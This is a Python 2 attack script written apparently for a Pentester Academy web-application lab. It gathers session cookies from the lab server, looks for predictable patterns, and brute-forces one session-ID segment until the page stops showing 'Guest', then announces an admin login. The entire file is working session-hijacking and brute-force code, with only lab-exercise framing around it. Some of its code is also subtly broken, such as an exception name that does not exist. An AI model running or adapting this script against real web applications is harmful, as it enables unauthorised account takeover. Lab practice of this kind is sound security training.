#!/usr/bin/python

import requests
import base64
import sys
from itertools import izip
from termcolor import colored

url_base = "http://pentesteracademylab.appspot.com/lab/webapp/sid/3"
print colored("[*]Request The URL ... Cookie Analysis ... ","yellow")

s1=()
s2=()
s3=()
s4=()
s5=()
SID = [s1,s2,s3,s4,s5]
#This process will take time .. Be Patient :)
for i in range(0,100):
	print "+",
	if i == 50:
		print "50 % Done"
	if i == 99:
		print "99 % ... We Are Almost Done"
	try:
		analysis = requests.get(url_base)
		s1 +=analysis.headers.get("set-cookie").split(",")[0].split("=")[1], 
		s4 +=analysis.headers.get("set-cookie").split(",")[1].split("=")[1],
		s2 +=analysis.headers.get("set-cookie").split(",")[2].split("=")[1],
		s3 +=analysis.headers.get("set-cookie").split(",")[3].split("=")[1], 
		s5 +=analysis.headers.get("set-cookie").split(",")[4].split("=")[1],
 	except (requests.HTTPError,  requests.ConnectError) as e:
   		print "Error({0}): {1}".format(e.errno, e.strerror)

def Analysis(SessionID):
	FLAG = 0
	INIT = SessionID[0]
	for i in SessionID:
		for (x,z) in izip(i,INIT):
			if x == z:
				FLAG += 1
			INIT = i
	if FLAG >=500: #Approximately
		print colored("[*]Partial matching Found ... ", "yellow")
		print colored(i,"green")
		print colored(SessionID[0],"green")
		BruteForce(SessionID)

def BruteForce(TargetSID):
	#After Manual Analysis ... S3 is the Target Session ID to Brute Force
	print colored("[*]Try to BruteForce This SessionID ... Please Wait", "yellow")
	Login = requests.get(url_base)
	s1 = Login.headers.get("set-cookie").split(",")[0]	
	s4 = Login.headers.get("set-cookie").split(",")[1]
	s2 = Login.headers.get("set-cookie").split(",")[2]
	#s3 = Login.headers.get("set-cookie").split(",")[3]
	s5 = Login.headers.get("set-cookie").split(",")[4]
	for xx in range(0,100):
		CHeader = 'sessionid=1028; "%s"; "%s"; "%s"; s3=%s931866611669874561943317207057605631; "%s"' %(s1,s4,s2,xx,s5)
		Custome_header = {'Cookie': CHeader }
		Login = requests.get(url_base, headers = Custome_header)
		if Login.text.find("Guest") == -1:
			print colored("[*]Login as Admin with SessionID s3=%s931866611669874561943317207057605631 ... Done !! " %xx,"green")
			sys.exit(0)

Snum = 1
for Session in SID:
	print colored("[*]Analysing SessionID s%s ... Please Wait" %Snum,"yellow")
	Analysis(Session)
	Snum +=1



